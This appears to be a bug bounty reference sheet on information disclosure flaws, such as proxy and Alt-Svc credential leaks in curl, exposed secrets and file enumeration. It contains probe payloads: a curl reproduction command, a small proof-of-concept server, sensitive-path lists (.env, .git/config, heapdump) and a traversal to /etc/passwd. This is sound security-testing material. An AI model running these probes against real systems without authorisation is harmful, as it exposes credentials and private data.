# Information Disclosure Patterns

Common information disclosure vulnerability patterns derived from real-world bug bounty reports. Covers unintended data exposure through misconfiguration, protocol flaws, and application behavior.

---

## Root Cause Categories

### 1. Hop-by-Hop Header Leakage on Protocol Transition

**Root Cause:** Headers intended for a single hop (Proxy-Authorization) are not stripped when a request changes from a proxied connection to a direct connection after a redirect. The origin server receives credentials meant only for the proxy.

**Detection Strategy:**
1. Set up a controlled proxy that returns a 302 redirect to a direct URL
2. Send a request through the proxy with a Proxy-Authorization header
3. Check if the Proxy-Authorization header is present in the subsequent direct request
4. Test with different redirect types (301, 302, 307, 308) and different connection transitions

### 2. Alt-Svc Credential Leak

**Root Cause:** When curl (or similar clients) follows an Alt-Svc header to remap a connection to a different host/port, the credential protection check only validates against the original connection target, not the Alt-Svc remapped target. Additionally, the `this_is_a_follow` flag is not set for Alt-Svc redirects, bypassing the entire credential guard.

**Detection Strategy:**
1. Serve an Alt-Svc header pointing to an attacker-controlled server
2. Wait for the client to cache the Alt-Svc entry
3. On the next request to the original origin, check if credentials are sent to the Alt-Svc target
4. This affects clients that cache Alt-Svc entries (curl, some browsers)

### 3. Sensitive Data in Source Code / Response Bodies

**Root Cause:** API tokens, internal endpoints, database credentials, and other secrets are exposed in client-side code, HTML comments, or API responses that are visible to unauthenticated users.

**Detection Strategy:**
1. Check HTML source for comments containing sensitive data
2. Examine JavaScript source files for hardcoded API keys, tokens, or internal endpoints
3. Review API responses for excessive data (password hashes, internal IDs, PII)
4. Check for debug endpoints that return configuration details
5. Examine error messages for stack traces and path disclosure
6. Review response headers for server version information

### 4. Directory / File Enumeration

**Root Cause:** Directory listing is enabled on web servers, or files are stored in predictable locations without access controls. Commonly exposed are backup files, git repositories, configuration files, and logs.

**Detection Strategy:**
1. Fuzz for common sensitive paths
2. Check for `.git/HEAD`, `.svn/entries`, backup files (`*.bak`, `*.old`, `~`)
3. Check for common configuration file locations
4. Access known paths for the specific tech stack

---

## Common Attack Vectors

### Header Leakage

```http
-- Proxy-Authorization header leak
GET http://target.com/ HTTP/1.1
Proxy-Authorization: Basic base64(credentials)
Host: target.com

-- After 302 redirect to direct URL:
GET / HTTP/1.1
Host: originalserver.com
Proxy-Authorization: Basic base64(credentials)  # LEAKED!

-- curl reproduction command
curl -v -L \
  -x http://controlled-proxy:3128 \
  -H "Proxy-Authorization: Basic LEAK_TEST" \
  --noproxy 127.0.0.1 \
  http://target.com
```

### Alt-Svc Credential Bypass

```python
# Proof of concept for Alt-Svc credential leak
# 1. Server with Alt-Svc pointing to attacker
import http.server

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Alt-Svc', 'h2="attacker-server:8443"')
            self.end_headers()
            self.wfile.write(b'OK')

# 2. Client then sends subsequent requests with credentials
# to the Alt-Svc host instead of the original host

# 3. The credential guard in lib/vauth/vauth.c only checks
# conn->host.name and conn->remote_port, not conn_to_host/port
```

### Path/File Disclosure

```http
-- Common sensitive paths
/.git/config
/.svn/entries
/__pycache__/
/.env
/.env.example
/backup/
/dump/
/admin/backup
/phpinfo.php
/info.php
/server-status
/server-info
/actuator/env
/actuator/heapdump
/swagger-ui.html
/api-docs
/v2/api-docs
/v3/api-docs

-- Backup file patterns
/index.php.bak
/index.php~
/index.php.old
/config.php.backup
/config.php.save
/database.sql
/dump.sql
```

### Error-Based Disclosure

```http
-- Trigger stack traces via invalid input
GET /api/user?id=invalid
GET /api/user?id[]=1
GET /api/user?id=1'
GET /api/user?id=1%00

-- Path disclosure in errors
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

-- Path traversal to trigger errors
GET /static/../../../etc/passwd
```

### Configuration File Disclosure

```http
-- Google Cloud Storage bucket discovery
https://storage.googleapis.com/bucket-name
https://bucket-name.storage.googleapis.com

-- AWS S3 bucket listing
https://s3.amazonaws.com/bucket-name
https://bucket-name.s3.amazonaws.com

-- Accessible config files
GET /.env
GET /application.properties
GET /application.yml
GET /config.json
GET /config.php
GET /wp-config.php.bak
```

---

## Real-World Case References

| Report | Vulnerability | Technique | Bounty |
|--------|---------------|-----------|--------|
| curl (3480713) | Proxy-Authorization header leak on redirect | Hop-by-hop header not stripped on connection type transition | N/A |
| curl (3485826) | Alt-Svc bypasses credential leak protection (CVE-2018-1000007) | Alt-Svc remapping skips credential guard check | N/A |
| General | Stack trace disclosure | Trigger errors with invalid input | Common |
| General | S3 bucket listing | Misconfigured S3 bucket permissions | Common |
| General | Git repository exposed | `.git/HEAD` accessible via web | Common |
